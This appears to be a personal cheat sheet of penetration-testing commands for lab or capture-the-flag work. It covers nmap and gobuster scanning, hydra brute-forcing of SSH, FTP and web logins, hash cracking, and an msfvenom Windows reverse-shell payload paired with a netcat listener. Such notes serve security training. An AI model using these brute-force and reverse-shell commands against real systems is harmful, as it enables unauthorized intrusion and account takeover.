# CLI Toolset

## gobuster
Site discovery
```console
gobuster -u http://fakebank.com -w wordlist.txt dir
```
```console
gobuster -u http://$MACHINE_IP -w wordlist.txt -x php,sh,txt,cgi,html,js,css,py
```

## nmap
```console
nmap -sC -sV -oN nmap/initial $IP
```
Silence discovery:
```console
nmap -sS $MACHINE_IP
```
Ping Scan: Allows scanning the live hosts in the network without going deeper and checking for ports services etc. Usage:
```console
nmap -sn $MACHINE_IP
```
Operating System Scan: Allows scanning of the type of OS running on a live host. Usage: 
```console
nmap -O $MACHINE_IP
```
Detecting Services: Get a list of running services on a live host. Usage: 
```console
nmap -sV $MACHINE_IP
```
Check for vulns also:
```console
nmap -sV -sC --script vuln $MACHINE_IP
nmap -sV -vv --script vuln  $MACHINE_IP
```

Loud, but effectie:
```console
nmap -A $MACHINE_IP
```

In depth search:
```console
nmap -A -p- $MACHINE_IP
```

## nikto
Webserver vuln. disc.
```console
nikto -host $MACHINE_IP:80
```

## hydra
Bruteforce

```console
hydra -l '' -P 3digits.txt -f -v $MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

```console
hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://$MACHINE_IP -V
```

```console
hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt -f -v 10.10.66.58 http-post-form "/login.php:username=^USER^&password=^PASS^&sub=Login:Invalid username or password." -s 80
```

```console
hydra -l username -P /usr/share/wordlists/rockyou.txt $MACHINE_IP ftp
```

## crunch
Password list generator

## cewl

```console
cewl -d 2 -m 5 -w passwords.txt http://$MACHINE_IP --with-numbers
```

## nc

```console
nc -lnvp 4444
```

## msfvenom

A command-line payload generation tool

```console
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
```

## john

Brute force hash pwd

```console
john --wordlist=greedykeys.txt hash.txt
```

## searchsploit

Search ExploitDB

```console
searchsploit fuel cms
```

## hashcat

MD5 hash cracker

```console
hashcat -m 0 pash /usr/share/wordlists/rockyou.txt
```

## enum4linux
eg. SMB user name enumeration
-a all
```console
enum4linux -e $IP
```

## stegcracker
Steganograpy cracer

 ```console
stegcracker <file> [<wordlist>]
```

## binwalk
Check for hidden data

 ```console
binwalk <file>
```

Extract hidden files:
 ```console
binwalk -e <file>
```

## steghide
Steganograpy data

 ```console
steghide --info 'filename'
```

 ```console
steghide --extract -sf 'filename'
```
